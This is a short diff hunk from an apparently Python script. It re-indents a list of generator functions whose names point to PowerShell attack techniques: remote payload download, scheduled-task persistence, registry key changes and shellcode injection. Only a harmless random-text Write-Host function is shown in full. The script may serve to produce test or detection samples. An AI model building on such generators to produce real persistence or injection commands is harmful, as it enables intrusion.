@@ -60,13 +60,13 @@ def write_nonsense_cmd():
 	cmd = "Write-Host '" + get_random_text(100,1000) + "'"
 	return cmd
 
- commands = [
- 			["remote_payload_cmd", remote_payload_cmd], 
- 			["schtasks_persistence_cmd", schtasks_persistence_cmd], 
- 			["set_registry_key_cmd", set_registry_key_cmd],
- 			["inject_shellcode_cmd", inject_shellcode_cmd],
- 			["write_nonsense_cmd", write_nonsense_cmd]
- 			]
+commands = [
+			["remote_payload_cmd", remote_payload_cmd], 
+			["schtasks_persistence_cmd", schtasks_persistence_cmd], 
+			["set_registry_key_cmd", set_registry_key_cmd],
+			["inject_shellcode_cmd", inject_shellcode_cmd],
+			["write_nonsense_cmd", write_nonsense_cmd]
+			]
 
 # Testing:
 #commands = [remote_payload_cmd]
